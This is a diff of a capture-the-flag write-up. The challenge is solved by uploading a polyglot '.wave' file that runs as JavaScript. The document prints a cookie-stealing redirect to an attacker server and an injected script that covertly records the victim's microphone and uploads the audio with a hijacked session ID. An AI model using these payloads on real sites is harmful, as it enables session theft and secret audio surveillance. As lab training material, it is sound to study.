@@ -27,9 +27,10 @@ Server refuses the fiel when its extension is not ended with `.wav/.wave/.mp3/.o
 
 It considered as normal wave file since its magic number, but it also can be translated as following javascript.
 
-	RIFF=1;
-	alert('test);
-
+```javascript
+RIFF=1;
+alert('test);
+```
 
 I've tried script injection with .wav and .mp3 files, but both of them didn't work. It couldn't pass the MIME type check. ![mpeg MIME is not executable](https://i.imgur.com/5wBeF6O.png)
 
@@ -37,6 +38,7 @@ So I googled about it then I can find a document that lists [default apache MIME
 ![What is wave??](https://i.imgur.com/c5X5Dup.png)
 
 We can see apache doesn't recognize `.wave` extension as `audio/*`, thus including `.wave` file like following allows to script execution.
+
 `<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>`
 
 
@@ -48,6 +50,7 @@ Two steps required to get a flag.
 
 ### Show clips of admin
 Since we know how to execute javascript, stealing is easy. Various way to steal admin's clip.
+
 `location.href = <your server> + "?ck=" + "document.cookie"`
 
 After we change our session to admin's session, we can see two clips.
@@ -78,43 +81,48 @@ So final payload is
 
 Description field:
 
-	spatulate
-	<form action="create.php" method="post" enctype="multipart/form-data" id="upload-	form">
-		<input type="text" name="title" value="answer"/>
-		<input type="text" name="description" value="answer"/>
-		<audio id="record-playback" controls></audio>
-		<input type="submit" name="submit" value="submit" />
-	</form>
-	<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>
+```html
+spatulate
+<form action="create.php" method="post" enctype="multipart/form-data" id="upload-form">
+	<input type="text" name="title" value="answer"/>
+	<input type="text" name="description" value="answer"/>
+	<audio id="record-playback" controls></audio>
+	<input type="submit" name="submit" value="submit" />
+</form>
+<script src="uploads/upload_5aeea228222b70.00604196.wave"></script>
+```
 
 Script in .wave:
 
-	navigator.mediaDevices.getUserMedia({ audio: true })
-		.then((stream) => {
-		mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-		mediaRecorder.start();
-		let chunks = [];
-		mediaRecorder.addEventListener("dataavailable", (e) => {th
-			chunks.push(e.data);
-			console.log(e.data);
-		});
-		mediaRecorder.addEventListener("stop", () => {
-		   mediaBlob = new Blob(chunks);
-		   document.cookie = "PHPSESSID=v3368khvdmn5pl8ea6qh5g3ke3";
-		   let uploadForm = document.getElementById("upload-form");
-		   let formData = new FormData(uploadForm);
-		   formData.append("audiofile", mediaBlob, "audio.webm");
-		   let f = fetch("create.php", {
-				method: "POST",
-				body: formData,
-				credentials: "same-origin"
-			});	
-		})
-		setTimeout(function() {
-			mediaRecorder.stop();
-		}, 15000);
+```javascript
+navigator.mediaDevices.getUserMedia({ audio: true })
+	.then((stream) => {
+	mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+	mediaRecorder.start();
+	let chunks = [];
+	mediaRecorder.addEventListener("dataavailable", (e) => {th
+		chunks.push(e.data);
+		console.log(e.data);
 	});
+	mediaRecorder.addEventListener("stop", () => {
+		mediaBlob = new Blob(chunks);
+		document.cookie = "PHPSESSID=v3368khvdmn5pl8ea6qh5g3ke3";
 	
+		let uploadForm = document.getElementById("upload-form");
+		let formData = new FormData(uploadForm);
+	   	formData.append("audiofile", mediaBlob, "audio.webm");
+	   	let f = fetch("create.php", {
+			method: "POST",
+			body: formData,
+			credentials: "same-origin"
+		});	
+	})
+	setTimeout(function() {
+		mediaRecorder.stop();
+	}, 15000);
+});
+```	
+
 ###Final
 Injected script will write a new clip named 'answer' with an audio reading flag :D
 
